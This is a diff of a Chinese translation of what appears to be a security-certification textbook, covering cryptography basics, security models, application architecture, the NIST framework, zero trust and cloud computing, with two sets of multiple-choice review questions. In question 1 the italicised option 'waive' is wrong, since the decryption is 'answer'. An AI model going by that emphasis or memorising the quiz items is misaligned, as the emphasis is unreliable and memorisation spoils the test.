 如今，加密数据的方式多种多样，无论是全盘加密、单个卷加密还是单个文件加密。但请记住，加密的安全性取决于密钥的保护情况；如果密钥保护不当，或者有人能够访问一个已登录且未锁定的系统，数据实际上就是未加密的。
 
-
-
-
 加密是一个重要概念，因为隐私至关重要。这在攻击者寻找任何优势时尤为重要。如果他们能够拦截未加密的信息，可能会利用信息的内容。用户有时会错误地认为企业内部发送给其他用户的信息是安全的，因为它们仍然在企业内部。这些信息并不安全，因为可以被拦截并被利用。对基于磁盘的加密同样适用。你不能假设已加密的磁盘是安全的。一旦有人以合法用户身份验证，磁盘即解除加密。这意味着如果攻击者能够获得已验证的访问权限，即使通过作为主用户运行的恶意软件，磁盘也会完全暴露给攻击者。
 
 当你考虑最终结果时，有两种加密类型。第一种是替换，其中一个字符被另一个字符替换。这在诸如旋转密码和维杰纳密码等加密方案中很常见。第二种是转换密码。这里，未加密的信息（明文）不是逐字符替换，而是整个信息被转换，通常通过数学过程实现。这种转换可以使用固定长度的块进行，这属于块密码；也可以逐字节进行，这是流密码的工作方式。在块密码中，数据大小应为块大小的倍数。最后一个块可能需要填充以达到正确的大小。
 
-密钥管理至关重要。其中的一个重要元素是密钥创建。你可以使用预共享密钥，这些密钥在共享过程中可能会被学习或拦截。如果你不使用预共享密钥，密钥可以派生。这可以通过 Diffie‑Hellman 密钥交换协议实现。双方在共同的起点上添加一个值并将其传递给对方。一旦该值被加入到共享密钥中，双方都拥有相同的键，并可以开始发送加密消息。
+密钥管理至关重要。其中的一个重要元素是密钥创建。你可以使用预共享密钥，这些密钥在共享过程中可能会被学习或拦截。如果你不使用预共享密钥，密钥可以派生。这可以通过 `Diffie‑Hellman` 密钥交换协议实现。双方在共同的起点上添加一个值并将其传递给对方。一旦该值被加入到共享密钥中，双方都拥有相同的键，并可以开始发送加密消息。
 
 这种过程可以用于对称密钥，即相同的密钥用于加密和解密。高级加密标准（AES）是一种常见的对称密钥加密算法。AES 支持 128、192 和 256 位。你也可以使用非对称密钥算法，其中加密和解密使用不同的密钥。这有时被称为“公钥”密码学。常见的做法是使用混合密码系统，即使用公钥密码学来共享会话密钥，该会话密钥是用于会话内加密消息的对称密钥。
 
-证书由 X.509 定义，X.509 是 X.500 数字目录标准的子集，用于存储公钥信息。这包括证书持有者的身份信息，以便可以进行证书验证。证书可以通过 CA（受信任的第三方）进行管理，CA 用于验证证书持有者的身份。CA 并不是唯一验证身份的方式，PGP 使用信任网络模型，个人用户通过签名验证他们认识的人的公钥来验证身份。
+证书由 `X.509` 定义，`X.509` 是 `X.500` 数字目录标准的子集，用于存储公钥信息。这包括证书持有者的身份信息，以便可以进行证书验证。证书可以通过 `CA`（受信任的第三方）进行管理，`CA` 用于验证证书持有者的身份。`CA` 并不是唯一验证身份的方式，`PGP` 使用信任网络模型，个人用户通过签名验证他们认识的人的公钥来验证身份。
 
-MAC 用于确保消息未被篡改。这通常是一种密码散列，它从可变长度数据生成固定长度的散列值。这不仅可以用于消息验证，还可以用于验证文件未被篡改或损坏。
+`MAC` 用于确保消息未被篡改。这通常是一种密码散列，它从可变长度数据生成固定长度的散列值。这不仅可以用于消息验证，还可以用于验证文件未被篡改或损坏。
+
+
 
 全盘加密是当今系统中常见的技术。Windows 系统通常使用 BitLocker，但也有第三方软件解决方案提供相同功能。macOS 系统使用 FileVault，Linux 使用 `dm‑crypt`，它内置在内核中，但仍需在系统上安装实用程序来设置卷加密并打开加密卷。与任何加密一样，密钥管理至关重要，加密文件或文件系统并不能防止所有情况。加密文件如果密钥或密码丢失，可能会导致数据丢失。
 
-Review Questions
+# Review Questions
 
 你可以在附录中找到答案。
 
-1.  旋转 4 位后，`erwaiv` 解密为？
+1. 旋转 4 位后，`erwaiv` 解密为？
 
    1. *waive*
-
    2. wave
-
    3. answer
-
    4. decrypt
 
-2.  什么是加密前的消息？
+2. 什么是加密前的消息？
 
    1. Text
-
    2. Plain text
-
    3. Bare words
-
    4. Bare text
 
 3. PGP 用什么来验证身份？
 
    1. Central authority
-
    2. Web of users
-
    3. Web of trust
-
    4. Central trust authority
 
 4. 哪项原则用于证明签名消息来自持有签名密钥的所有者？
 
    1. Nonrepudiation
-
    2. Nonverifiability
-
    3. Integrity
-
    4. Authority
 
 5. Diffie‑Hellman 用于什么？
 
    1. Key management
-
    2. Key isolation
-
    3. Key exchange
-
    4. Key revocation
 
 6. 3DES 在改进 DES 的方面做了什么？
 
    1. Made the key longer
-
    2. Used two keys
-
    3. Changed algorithms
-
    4. Used three keys
 
 7. 椭圆曲线密码学带来了什么改进？
 
    1. Smaller keys improve speed
-
    2. Algorithm is more complex
-
    3. Doesn't use factoring, which is better
-
    4. Longer keys
 
 8. 当两个不同的数据集产生相同的密码散列时，这叫什么？
 
    1. Paradox
-
    2. Collision
-
    3. Crash
-
    4. Unrealistic
 
 9. 哪些术语可以用于描述非对称密钥加密？
 
    1. Defined key
-
    2. Multifactor
-
    3. Public key
-
    4. Single factor
 
 10. 如果艾丽丝要给鲍勃发送电子邮件，她会使用哪个密钥来加密消息？
 
-     1. PGP key
-
-     2. Private key
-
-     3. Public key
-
-     4. Symmetric key
+    1. PGP key
+    2. Private key
+    3. Public key
+    4. Symmetric key
 
 11. 哪项属性让你可以相信一个受你信任的证书颁发机构（CA）认证的对象？
 
-     1. Commutative property
-
-     2. Associative property
-
-     3. Communicative property
-
-     4. Transitive property
+    1. Commutative property
+    2. Associative property
+    3. Communicative property
+    4. Transitive property
 
 12. 为什么对称密钥加密通常比非对称密钥加密更常用？
 
-     1. It's faster.
-
-     2. It's more secure.
-
-     3. It's easier to implement.
-
-     4. It isn't encumbered with patents.
+    1. It's faster.
+    2. It's more secure.
+    3. It's easier to implement.
+    4. It isn't encumbered with patents.
 
 13. 当同时使用对称键和非对称键时，这叫什么？
 
-     1. Fast cryptosystem
-
-     2. Hybrid cryptosystem
-
-     3. Super‑symmetric cryptosystem
-
-     4. Dual key cryptosystem
+    1. Fast cryptosystem
+    2. Hybrid cryptosystem
+    3. Super‑symmetric cryptosystem
+    4. Dual key cryptosystem
 
 14. MD5 或 SHA‑1 在密码学中通常用于什么？
 
-     1. Media access control (MAC)
-
-     2. Machine authentication code (MAC)
-
-     3. Message access code (MAC)
-
-     4. Message authentication code (MAC)
+    1. Media access control (MAC)
+    2. Machine authentication code (MAC)
+    3. Message access code (MAC)
+    4. Message authentication code (MAC)
 
 15. PGP 使用哪种类型的加密？
 
-     1. Null key
-
-     2. Asymmetric key
-
-     3. Trusted key
-
-     4. Web key
+    1. Null key
+    2. Asymmetric key
+    3. Trusted key
+    4. Web key
 
 16. 哪个工具可以用于识别 Web 服务器上使用的密码套件？
 
-     1. `Hydra`
-
-     2. `sslscan`
-
-     3. `tlsscan`
-
-     4. `cipherscan`
+    1. `Hydra`
+    2. `sslscan`
+    3. `tlsscan`
+    4. `cipherscan`
 
 17. AES 如何防止相关键攻击？
 
-     1. Longer key lengths
-
-     2. Better initialization vectors
-
-     3. Implementation doesn't allow related keys
-
-     4. Upgrading to AES‑2
+    1. Longer key lengths
+    2. Better initialization vectors
+    3. Implementation doesn't allow related keys
+    4. Upgrading to AES‑2
 
 18. 使用证书颁发机构的一个优势是什么？
 
-     1. Trusted third party doing validation
-
-     2. A certificate authority is faster
-
-     3. Stronger keys are offered
-
-     4. They support more cipher suites
+    1. Trusted third party doing validation
+    2. A certificate authority is faster
+    3. Stronger keys are offered
+    4. They support more cipher suites
 
 19. 证书颁发机构如何保持有效证书列表的最新？
 
-     1. Periodic CA update
-
-     2. Hashing the list
-
-     3. Re‑validating identities
-
-     4. Certificate revocation lists
+    1. Periodic CA update
+    2. Hashing the list
+    3. Re‑validating identities
+    4. Certificate revocation lists
 
 20. 哪项安全属性表明，由个人密钥签名的电子邮件必然来自该人？
 
-     1. Confidentiality
+    1. Confidentiality
+    2. Integrity
+    3. 可用性
+    4. 不可否认性
 
-     2. Integrity
-
-
-
-
-## 3. 可用性
-
-## 4. 不可否认性
-
-# 第 14 章  
+# 第 14 章
 
 ## 安全架构与设计
 
@@ -11899,20 +12897,17 @@ Review Questions
 
 状态机模型用于识别系统整体安全性是否已进入不安全的状态。这要求识别系统的所有可能状态，以及使系统进入特定状态的所有可能操作以及所有可能的状态转换。当系统发生意外转换或操作导致意外状态时，可以进行监控并发出警报。
 
-
-
-
 这款模型比这里讨论过的其他模型要更抽象，因为它实际上并没有定义任何预期行为。它仅仅是一种建模环境的方式，需要有人来定义预期行为和状态。
 
 ### Biba
 
 Biba 模型是以 1975 年开发它的 Kenneth Biba 之名命名的。Biba 模型的目标是数据完整性。因此，这个模型也被称为 Biba 完整性模型。请记住，安全性不总是关于保护数据的机密性。数据的完整性同样重要。数据在未经授权或错误的人员修改时，也会对组织造成损害。这可能比你想象的更为复杂。在确保数据完整性时，有三个目标：
 
-*   未经授权的各方不能修改数据。
+* 未经授权的各方不能修改数据。
 
-*   授权的各方不能在没有特定授权的情况下修改数据。
+* 授权的各方不能在没有特定授权的情况下修改数据。
 
-*   数据应真实准确，意味着它具备内部和外部的一致性。
+* 数据应真实准确，意味着它具备内部和外部的一致性。
 
 第二个目标可能看起来有些困惑。仅仅拥有系统或网络的登录并不意味着你可以访问所有数据。第一个目标是确保外部没有访问权限的人不能修改数据。第二个目标是防止内部人员修改他们不应该修改，或者甚至不应该查看的数据。
 
@@ -11920,11 +12915,11 @@ Biba 模型是以 1975 年开发它的 Kenneth Biba 之名命名的。Biba 模�
 
 Biba 模型定义了三条规则：
 
-*   简单完整性属性（The Simple Integrity Property）说，一个完整性级别的主体不能读取一个完整性级别更低的数据对象。
+* 简单完整性属性（The Simple Integrity Property）说，一个完整性级别的主体不能读取一个完整性级别更低的数据对象。
 
-*   星（\*）完整性属性（The \* Integrity Property）说，一个完整性级别的主体不能写入完整性级别更高的数据对象。
+* 星（\*）完整性属性（The \* Integrity Property）说，一个完整性级别的主体不能写入完整性级别更高的数据对象。
 
-*   调用属性（The Invocation Property）说，下级过程不能请求更高级别的访问权限。进程只能在其自身级别或以下的级别上访问。
+* 调用属性（The Invocation Property）说，下级过程不能请求更高级别的访问权限。进程只能在其自身级别或以下的级别上访问。
 
 当然，并非所有的安全模型都关注数据完整性。这意味着你可能会看到不同模型之间出现一些冲突。
 
@@ -11934,11 +12929,11 @@ Bell–LaPadula 用于政府或军事实现，其意图是保护机密性。与 
 
 正如所述，Bell–LaPadula 关注的是机密性而非完整性。因此，该模型定义的属性与 Biba 模型定义的属性不同。Bell–LaPadula 的属性如下：
 
-*   简单安全属性（The Simple Security Property）说，一个安全级别的主体不能读取更高安全级别的对象。
+* 简单安全属性（The Simple Security Property）说，一个安全级别的主体不能读取更高安全级别的对象。
 
-*   星（\*）属性（The \* Property）说，一个安全级别的主体不能写入更低安全级别的对象。
+* 星（\*）属性（The \* Property）说，一个安全级别的主体不能写入更低安全级别的对象。
 
-*   离散安全属性（The Discretionary Security Property）使用访问矩阵来指示离散访问。
+* 离散安全属性（The Discretionary Security Property）使用访问矩阵来指示离散访问。
 
 Bell–LaPadula 提供了两条强制访问控制规则（简单安全属性和 \* 属性）以及一条离散访问控制规则。强制访问控制由操作系统处理。规则是基于策略创建的，用户无法操纵这些规则。离散访问控制允许用户根据自身需求和掌握的数据，自行设置访问规则。在离散访问控制下，企业无法控制哪些主体被允许访问哪些对象。
 
@@ -11956,9 +12951,6 @@ Clark–Wilson 模型是另一个关注完整性而非机密性的模型。这�
 
 过去，应用程序运行在单一系统上。这要追溯到大型机时代，当时用户会连接到大型机并在那里运行程序。程序的所有相关内容，包括程序可能需要的任何数据，都存在于单一系统上。该系统上有控制措施，以防止未经授权的访问，尤其是因为系统只有一个入口。随着个人计算机的出现，在它们连接到网络之前，程序运行在单一系统上。数据也与程序和系统一起存储。一旦系统连接到网络，可能性便扩大了。数据可以存储在运行程序的系统之外。此外，用户不需要在运行程序的系统上。一切都可以被分段。
 
-
-
-
 除分段之外，还需要考虑网络地理。曾经，所有内容可能都在一家公司的网络上。但这已不再如此，因为有服务提供商可以提供计算资源。这使得应用架构的可能性变得非常广阔。即使是应用的构建方式也发生了改变。我们不再拥有必然运行应用的系统。云服务提供商 —  — 系统位于服务提供商的 premises 并以虚拟方式消费 —  — 正在改变应用的架构方式。
 
 经典的应用架构是 n‑tier 设计模型。多年来，应用开发人员一直在使用这种设计。然而，这正在改变。面向服务的架构（SOA）将单体设计的概念拆分为独立的服务。这些服务之间相互交互。最终结果相同。不同之处在于数据的处理方式以及应用的构建方式。尤其是结合前文，数据库的考虑因素也在发生变化。
@@ -11966,6 +12958,8 @@ Clark–Wilson 模型是另一个关注完整性而非机密性的模型。这�
 ## n‑tier Application Design
 
 n‑tier 设计是一种分层应用模型。在某些情况下，它也被称为模型‑视图‑控制器（MVC）设计，尽管这些多层结构中可能包含其他元素。这些层也被称为表示层、应用层、业务层和数据访问层。下图展示了该设计的示例：Figure 14.2。
+
+
 
 Presentation 层（即视图）位于客户端，如图中所示的笔记本电脑。下一层是 Application 层，逻辑在此层实现。可编程功能居住在 Application 层。有时该层会进一步划分为 Application 与 Business Logic 层。
 
@@ -11991,18 +12985,15 @@ Presentation 层（即视图）位于客户端，如图中所示的笔记本电�
 
 这些关联能够在不需要单一巨型表且重复数据的情况下，将关联数据保持在一起。例如，在 Figure 14.4 中可以看到有一个定义宠物的表，该表包含唯一标识字段、名称、性别和品种。随后有一个访问表，其中记录访问日期。由于每只宠物会有多次访问，需要一种方式将这两行数据关联起来。可以通过第三张表实现，在该表中加入其他两张表的关键标识字段。该表负责维护这两个数据结构之间的映射。实体‑关系图是一种思维模型，其实现形式即为多层架构中的数据层。
 
-## Service‑Oriented Architecture
+# Service‑Oriented Architecture
 
 面向服务的架构（SOA）对应用的视角与传统方式不同。它不从端到端（用户到数据存储）思考应用，而是关注实现应用所需的各个功能。这些功能可以实现为微服务。应用的架构是这些服务之间的连接，用以实现最终用户或应用消费者所需的全部特性。这些服务通常是抽象的，即作为黑盒工作。使用服务的程序员可能并不了解其内部工作原理，只知道如何以有用的方式消费该服务。
 
 这意味着通信协议已经得到明确定义。它们可能使用远程方法调用（RMI）、远程过程调用（RPC）或表示式状态转移（REST）等协议。这些现有的通信协议使得程序员无需自行创建新协议，即可在服务之间进行通信。服务通过库调用这些协议与其他服务交互，而无需自行实现全新的通信方式。
 
+- 服务导向架构的另一个优势是，一旦你将函数抽象为服务，并允许通信在调用函数所在的进程空间之外发生，你就可以将该服务部署在任何位置。快速网络和快速处理器使这种进一步抽象成为可能。它还可能限制妥协的影响范围。一旦服务被妥协，攻击者仅获得对该内存空间的访问，那里可能什么也没有，甚至整个系统也可能只有短暂且不完整的数据，这取决于服务的实现和整体应用设计。这意味着服务通常会被外部暴露，攻击者可以从一个服务或系统探测到另一个。
 
-
-
--   服务导向架构的另一个优势是，一旦你将函数抽象为服务，并允许通信在调用函数所在的进程空间之外发生，你就可以将该服务部署在任何位置。快速网络和快速处理器使这种进一步抽象成为可能。它还可能限制妥协的影响范围。一旦服务被妥协，攻击者仅获得对该内存空间的访问，那里可能什么也没有，甚至整个系统也可能只有短暂且不完整的数据，这取决于服务的实现和整体应用设计。这意味着服务通常会被外部暴露，攻击者可以从一个服务或系统探测到另一个。
-
-[Figure 14.5 显示了使用服务导向架构设计的应用示例。图表的最上方是 Web 界面。应用程序不一定需要传统的界面。使用 Web 界面往往与安装本地代码应用程序到系统一样容易，甚至更容易让用户消费 Web 界面，而不是需要在系统上安装本地代码应用程序。
+Figure 14.5 显示了使用服务导向架构设计的应用示例。图表的最上方是 Web 界面。应用程序不一定需要传统的界面。使用 Web 界面往往与安装本地代码应用程序到系统一样容易，甚至更容易让用户消费 Web 界面，而不是需要在系统上安装本地代码应用程序。
 
 在分割线下方是一组服务，这些服务可以被应用程序的任何组件消费。这些服务可能包括登录服务、用户管理服务、用户个人资料服务、数据建模服务和存储服务。这意味着应用程序本身是高度模块化的，这长期以来一直被认为是软件设计的良好做法。当它以这种模块化和抽象方式设计时，任何一块都可以轻松被拆除并替换。
 
@@ -12036,9 +13027,7 @@ Presentation 层（即视图）位于客户端，如图中所示的笔记本电�
 
 ![FIGURE 14.7 AWS serverless architecture](img/c14f007.png)
 
-
-
-# 图 14.7 (##c14.xhtml#R_c14-fig-0007) AWS 服务器无服务器架构
+**图 14.7** AWS 服务器无服务器架构
 
 ## 数据库考量因素
 
@@ -12084,12 +13073,9 @@ Microsoft 的 SQL Server 也是常见的数据库服务器，尤其在已经大�
 
 要实现自上而下定义的安全架构，企业应利用已有的业务路线图或长期规划，并结合行业趋势或针对该企业或所在垂直行业的威胁情报。
 
+- 企业最重要的考虑因素是如何处理风险。风险是因利用漏洞而导致的损失或损害的实际化的概率。企业对风险的看法可能因它们如何识别威胁或量化损失或损失的概率而有所不同。总体而言，企业需要管理业务风险，并且企业对其信息资源所关联的风险更加意识。一旦企业掌握了风险识别和管理以及风险管理所需的计划，就能生成安全架构中应包含的要求。
 
-
-
--   企业最重要的考虑因素是如何处理风险。风险是因利用漏洞而导致的损失或损害的实际化的概率。企业对风险的看法可能因它们如何识别威胁或量化损失或损失的概率而有所不同。总体而言，企业需要管理业务风险，并且企业对其信息资源所关联的风险更加意识。一旦企业掌握了风险识别和管理以及风险管理所需的计划，就能生成安全架构中应包含的要求。
-
-企业应有一套可遵循的方法论，提供额外指导。这可以通过采用框架来实现。国家标准技术研究院（NIST）已制定了网络安全框架，该框架强调企业在实施安全控制时应考虑的阶段。NIST 识别的阶段或类别包括 `identify`、`protect`、`detect`、`respond` 和 `recover`。NIST 将这些称为 *五个功能*，它们是 NIST 网络安全框架的核心。你可以在 [Figure 14.9 中看到这五个功能的示意。你会注意到它们呈圆形排列。这是因为每个功能都有输入进入下一个功能。循环永无止境。
+企业应有一套可遵循的方法论，提供额外指导。这可以通过采用框架来实现。国家标准技术研究院（NIST）已制定了网络安全框架，该框架强调企业在实施安全控制时应考虑的阶段。NIST 识别的阶段或类别包括 `identify`、`protect`、`detect`、`respond` 和 `recover`。NIST 将这些称为 *五个功能*，它们是 NIST 网络安全框架的核心。你可以在 Figure 14.9 中看到这五个功能的示意。你会注意到它们呈圆形排列。这是因为每个功能都有输入进入下一个功能。循环永无止境。
 
 ![FIGURE 14.9 NIST's five functions](img/c14f009.png)
 
@@ -12100,6 +13086,8 @@ Microsoft 的 SQL Server 也是常见的数据库服务器，尤其在已经大�
 `Protect` 功能在没有识别所有业务资产及其对组织重要性的前提下无法执行。`Protect` 不仅仅是确保有控制措施阻止攻击者。该功能是整体保护业务资产，意味着需要能够维护软件或硬件。这包括制定保持所有资产更新的计划。同时，还需要身份和访问管理功能，确保只有授权用户才能访问业务资源。业务资源包括实体资源（如建筑）以及建筑内可能存放关键资产的任何区域，无论是实体的还是信息性的。
 
 我们并不期望防护能够完美。没有办法在保持业务运营的同时完全阻挡 adversaries。因此，必须具备检测能力。检测不仅仅是识别异常和事件，还需要理解这些事件的影响。这也关联到 `Identify` 功能。`Identify` 的一部分应包括对业务资产进行分类和优先级排序，这有助于团队理解影响。如果检测到事件，可根据其真实性、影响以及其他业务决定的因素进行评估和优先级排序。
+
+
 
 一旦事件被检测，应进行调查。如果判定为影响有限或无影响，可能仅记录。如果事件可能构成风险（可度量的损失或损害概率），则将其视为事件，触发 `Respond` 功能。`Respond` 功能用于隔离事件并采取缓解措施进行解决。`Respond` 也不仅在发生事件时使用；它需要提前准备。企业必须制定 `Respond` 功能的计划，以应对不同的情境，确保在发生时能够应对。该功能还需要与利益相关者沟通，包括内部利益相关者以及可能的执法部门或其他外部实体。
 
@@ -12120,8 +13108,6 @@ NIST 并非唯一提供指导的参与者。还有其他组织同样能够帮助
 另一种观察攻击者操作方式的方法是 Lockheed Martin 的网络杀链模型。该模型识别攻击者如何实现其目标，是一个七步过程，由 Lockheed Martin 确定。具体步骤如下：
 
 1. **侦察**：这是攻击者识别可能用于目标的电子邮件地址的阶段。
-
-
 
 2. **`Weaponization`:** 在这一阶段会开发负载，包括一个后门，可让攻击者获得访问权限。
 
@@ -12165,9 +13151,6 @@ COVID 疫情可能是许多组织将整体安全架构转向零信任模型的�
 
 `Web applications` 通常使用多层架构。浏览器是表示层（视图）。很可能有一个运行 Java、.NET、PHP 或其他语言的应用服务器，负责业务和应用逻辑（控制器）。最后通常有一个数据存储，可能是数据库，属于数据访问层（模型）。
 
-
-
-
 现代应用程序仍然使用多层架构，但也常常被拆分为函数或服务。当以这种方式查看或设计应用程序时，它被称为面向服务的架构（SOA）。这意味着整体应用被拆分为服务，服务之间相互交互。它提供了模块化，使任何服务都可以在保持相同输入/输出规范的前提下被替换为另一个服务，而不需要修改应用程序的其余部分。最近，这种方法被适配为微服务架构。微服务通过使用 Docker 或 Kubernetes 等容器进一步增强。
 
 有时，这些容器是通过云服务提供商实现的。传统的应用程序架构也可以使用云服务提供商来实现，你可能会得到一种混合方式，其中部分应用在本地实现，而其他部分则使用云服务提供商。云服务提供商也开始向应用开发者展示新的应用设计思路，包括服务器无服务器（serverless）函数。这些函数通过串联来构建整体应用，但底层没有可被攻击者获取的服务器。类似地，容器的使用有时会导致自动化基础设施，容器和虚拟机在需求出现时被创建并按需拆除。获得此类环境访问权限的攻击者可能会在系统突然消失（包括攻击者放置的文件）时不得不重新开始。
@@ -12180,151 +13163,209 @@ NIST 并非唯一提供安全建议的组织。ISO 27001 是信息安全管理�
 
 NIST 还提供了零信任实施的指导，这是一种确保所有业务资源均使用更强身份验证的方法。企业通常过度信任其物理控制下的资源。零信任消除了这种做法，并保证所有访问都通过强身份验证、多因素认证来进行。
 
-1.  哪种安全三元组属性与 Biba 安全模型相关？
+1. 哪种安全三元组属性与 Biba 安全模型相关？
 
-    1. 保密性  
-    2. 完整性  
-    3. 可用性  
-    4. 以上全部  
+   1. 保密性  
 
-2.  n‑层应用设计中有多少层？
+   2. 完整性  
 
-    1. 两层  
-    2. 三层  
-    3. 四层  
-    4. 取决于应用  
+   3. 可用性  
+
+   4. 以上全部  
+
+2. n‑层应用设计中有多少层？
+
+   1. 两层  
+
+   2. 三层  
+
+   3. 四层  
+
+   4. 取决于应用  
 
 3. JSON 最可能代表哪种数据库类型？
 
-    1. 关系型  
-    2. SQL  
-    3. 键值对  
-    4. 基于文档  
+   1. 关系型  
+
+   2. SQL  
+
+   3. 键值对  
+
+   4. 基于文档  
 
 4. NIST 网络安全框架规定了多少功能？
 
-    1. 无  
-    2. 三个  
-    3. 五个  
-    4. 四个  
+   1. 无  
+
+   2. 三个  
+
+   3. 五个  
+
+   4. 四个  
 
 5. ISO 27001 循环有多少步骤？
 
-    1. 两个  
-    2. 三个  
-    3. 四个  
-    4. 五个  
+   1. 两个  
+
+   2. 三个  
+
+   3. 四个  
+
+   4. 五个  
 
 6. 美国政府使用的最高级别分类是什么？
 
-    1. 绝密  
-    2. 机密  
-    3. 限制  
-    4. 只供目视  
+   1. 绝密  
+
+   2. 机密  
+
+   3. 限制  
+
+   4. 只供目视  
 
 7. 微服务是哪种架构的具体实现？
 
-    1. 服务对象架构  
-    2. 微信道架构  
-    3. 微服务架构  
-    4. 面向服务的架构  
+   1. 服务对象架构  
+
+   2. 微信道架构  
+
+   3. 微服务架构  
+
+   4. 面向服务的架构  
 
 8. 只使用 AWS Lambda 函数的应用被称为什么？
 
-    1. 面向服务  
-    2. 虚拟化  
-    3. 无服务器  
-    4. 基础设施即服务  
+   1. 面向服务  
+
+   2. 虚拟化  
+
+   3. 无服务器  
+
+   4. 基础设施即服务  
 
 9. Clark–Wilson 模型使用什么来指代对象？
 
-    1. UTI 和 CDI  
-    2. CDI 和 CTI  
-    3. UDI 和 CDI  
-    4. UTI 和 UDI  
+   1. UTI 和 CDI  
+
+   2. CDI 和 CTI  
+
+   3. UDI 和 CDI  
+
+   4. UTI 和 UDI  
 
 10. 在不使用虚拟化超级计算机的情况下，哪种应用虚拟化最合适？
 
     1. 仿真  
+
     2. AWS  
+
     3. 伴随虚拟化  
+
     4. 容器  
 
 11. NIST 网络安全框架中指定的第一个功能是什么？
 
     1. 识别  
+
     2. 保护  
+
     3. 风险管理  
+
     4. 防御  
 
 12. n‑层应用设计中常见的中间层是什么？
 
     1. Web 服务器  
+
     2. 数据库服务器  
+
     3. 逻辑服务器  
+
     4. 应用服务器  
 
 13. 可能在 Web 应用中使用的开源关系型数据库服务器是什么？
 
     1. MongoDB  
+
     2. MySQL  
+
     3. SQL  
+
     4. Oracle  
 
 14. 关于 Bell–LaPadula 简单安全属性，下列哪项是正确的？
 
     1. 主体不能向上写入对象。  
+
     2. 主体不能向下写入对象。  
+
     3. 主体不能向上读取对象。  
+
     4. 主体不能向下读取对象。  
 
 15. ISO 27001 循环的阶段有哪些？
 
     1. 计划、识别、执行、检测  
+
     2. 计划、检测、执行、实施  
+
     3. 执行、实施、识别、游戏  
+
     4. 计划、实施、检查、执行  
 
 16. 零信任架构的关键要素是什么？
 
     1. 云端应用  
+
     2. 多因素认证  
+
     3. 虚拟专用网络  
+
     4. 虚拟桌面接口  
 
 17. 服务器无服务器计算通常使用何种处理方式？
 
     1. 并行  
+
     2. 程序化  
+
     3. 事件驱动  
+
     4. 功能性  
 
 18. 在零信任模型中实现多因素认证的最佳方式是什么？
 
     1. 短信  
+
     2. 推送批准  
+
     3. 用户名/密码  
+
     4. 一次性密码（OTP）  
 
 19. 网络杀戮链（Cyber Kill Chain）用于什么？
 
     1. 识别攻击者  
+
     2. 定义监控动作  
+
     3. 描述攻击过程  
+
     4. 开发命令与控制系统  
 
 20. 如果工作站不直接位于企业网络，在零信任设计中保护工作站的有用软件是什么？
 
     1. Syslog  
+
     2. EDR  
+
     3. SAP  
+
     4. SCCM  
 
-Cloud Computing and the Internet of Things  
+# Cloud Computing and the Internet of Things
+
 如今，几乎所有业务都在使用某种形式的云服务。这可能只是使用云提供商提供的电子邮件服务，也可能是企业将多个 Web 应用部署到云环境中，采用云原生设计。由于基础设施迁移至云提供商，攻击也随之转向这些环境。云服务提供商还为应用开发提供了许多在传统企业难以实现的功能，因为所需基础设施的投资成本过高。除此之外，还需要具备相应的技能才能实现这些功能，它们并非免费。
-
-
-
 
 云计算为企业提供了一种快速且简便的方式，将其信息技术需求外包。您可以快速且无需额外成本地部署大量基础设施。这为小公司提供了以与大公司相同的系统和服务快速且低廉地开始运营的机会。正是这种优势推动了众多公司向云服务迁移，因此您必须了解不同类型的云服务以及它们的使用方式。
 
@@ -12344,22 +13385,21 @@ Cloud Computing and the Internet of Things
 
 当时，您几乎可以让服务公司完成您想象的任何计算任务。这可能受限于当时人们对这些设备的用途仍在摸索。上世纪 80 年代，我在一家服务公司工作，主要负责管理和打印地址标签，这些标签随后用于大型目录的标签。当时，个人电脑刚刚起步，直接购买硬件和存储容量来存储可能数百万个姓名和地址显然更为困难，因此支付服务公司管理九轨磁带更为便捷。Figure 15.2 展示了一小段九轨磁带。想象一下同时拥有数十段这样的磁带，而个人电脑最大的磁盘驱动器容量可能仅为 5 MB。
 
+
+
 ![FIGURE 15.2 Nine‑track magnetic tape](img/c15f002.png)
 
 **FIGURE 15.2** Nine‑track magnetic tape
 
 我们稍后将详细描述这些服务。首先，是什么让某种服务成为云服务？云计算服务通常具备共同的特征，无论提供何种类型的服务。首先，云计算服务通常通过基于网页的技术进行访问和管理。您可以通过标准协议（如超文本传输协议 HTTP）和呈现语言（如超文本标记语言 HTML）在基于网页的界面上管理或访问服务，这使得您可以通过浏览器从世界任何地方访问该服务。
 
-云计算服务还通常支持快速且灵活的交付，这意味着如果您需要例如一个服务器，只需向提供商请求，即可几乎立即获得服务 —  — 远快于您自行或作为企业进行配置所需的数小时、数天或数周。正如您稍后所见，您还可以获得细粒度的访问，即仅获取您想要的服务。并非每个人都需要管理整台服务器并自行安装所需内容。有时，您只需要存储空间或访问某个应用。其余部分则是许多冗余开销。
+云计算服务还通常支持快速且灵活的交付，这意味着如果您需要例如一个服务器，只需向提供商请求，即可几乎立即获得服务——远快于您自行或作为企业进行配置所需的数小时、数天或数周。正如您稍后所见，您还可以获得细粒度的访问，即仅获取您想要的服务。并非每个人都需要管理整台服务器并自行安装所需内容。有时，您只需要存储空间或访问某个应用。其余部分则是许多冗余开销。
 
 企业通常拥有其网络中所有服务器的全部资源，而云服务提供商则采用所谓的 *multitenancy*（多租户）模式。想象提供商网络空间中的每台计算机系统像公寓大楼，每个公寓由不同的人租用。云计算服务亦是如此：每台物理服务器上可能存在多个虚拟系统或应用，正如公寓大楼拥有多个公寓和居住者。正如公寓大楼，每个人都希望拥有自己的空间。当然，可能会有共享空间（例如管理界面），但每个公寓应保持私密，以确保居民的资料安全，防止未经授权的访问。
 
 这种多租户模式正是云计算运作的关键，也是其经济规模的基础。如果每项服务都需要一台专用服务器，云提供商就没有商业优势，也没有利润动力。一旦引入多租户，诸多可能性随之开启。除了显著降低单个应用或服务器的成本外，我们还获得了诸多其他好处。
 
-使用云服务的主要优势常被认为是成本降低和运维开销减少 —  — 无需额外的机房空间、空调或电力。更重要的是，您可以获得世界级的可用性，这对企业而言难以单独实现。曾经，电信提供商强调所谓的 *five 9s* 可靠性，即 99.999% 的可用性，这在实际操作中意味着每年仅约五分钟的停机时间。如果您考虑一次电力中断，它能仅持续五分钟吗？如果是网络连接中断又如何？显然不一定只有五分钟。
-
-
-
+使用云服务的主要优势常被认为是成本降低和运维开销减少——无需额外的机房空间、空调或电力。更重要的是，您可以获得世界级的可用性，这对企业而言难以单独实现。曾经，电信提供商强调所谓的 *five 9s* 可靠性，即 99.999% 的可用性，这在实际操作中意味着每年仅约五分钟的停机时间。如果您考虑一次电力中断，它能仅持续五分钟吗？如果是网络连接中断又如何？显然不一定只有五分钟。
 
